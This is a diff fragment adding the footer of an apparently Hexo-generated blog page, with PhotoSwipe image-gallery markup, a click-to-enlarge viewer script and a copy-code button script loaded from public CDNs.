+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
